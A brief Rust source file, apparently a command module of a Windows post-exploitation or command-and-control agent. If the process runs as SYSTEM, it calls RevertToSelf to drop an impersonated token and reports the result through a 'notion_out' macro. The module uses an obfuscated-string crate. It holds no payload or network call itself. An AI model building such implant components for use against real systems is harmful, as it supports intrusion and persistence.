#[cfg(windows)] use windows::{
    Win32::{
        Foundation::{
            BOOL,
        },
        Security::{
            RevertToSelf
        }
    }
};
#[cfg(windows)] use whoami;
use std::error::Error;
use litcrypt::lc;
use crate::logger::{Logger, log_out};
use crate::cmd::notion_out;

/// Reverts to self if impersonated
pub async fn handle() -> Result<String, Box<dyn Error>> {
    
    #[cfg(windows)] {
        let username = whoami::username();
        if username == "SYSTEM" {
            unsafe {
                if RevertToSelf().0 == 1 {
                    return notion_out!("Reverted to Self: ", username.as_str());
                } else {
                    return notion_out!("Could not revert");
                }
            }
        }
        notion_out!("Not SYSTEM, no reason to revert!")
    }
    
    #[cfg(not(windows))] {
        notion_out!("This module only works on Windows!")
    }
}